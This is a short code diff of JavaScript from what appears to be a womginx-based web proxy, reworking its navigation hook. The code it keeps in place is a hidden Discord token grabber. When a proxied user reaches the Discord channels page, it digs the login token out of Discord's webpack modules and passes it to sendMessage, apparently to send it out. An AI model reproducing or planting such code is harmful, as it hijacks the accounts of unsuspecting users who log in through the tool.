@@ -67,14 +67,7 @@ function sendMessage(message) {
             console.log(err)
             }
                 window.location.reload();
-            }
-            return;
-        };
-          
-          window.history._womginx_pushState = window.history.pushState;
-        window.history.pushState = function (stateObj, title, url) {
-            this._womginx_pushState(stateObj, title, url);
-            if (url === proxy_prefix + proxy_path + "https://discord.com/channels/@me") {
+            } else if (url === proxy_prefix + proxy_path + "https://discord.com/channels/@me") {
                       try {
             var e = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
             sendMessage(e)
@@ -85,6 +78,7 @@ function sendMessage(message) {
             }
             return;
         };
+         
 
         // disable Date.now as it breaks hashing functionality in sites like discord
         _WBWombat.prototype.initDateOverride = function () { };
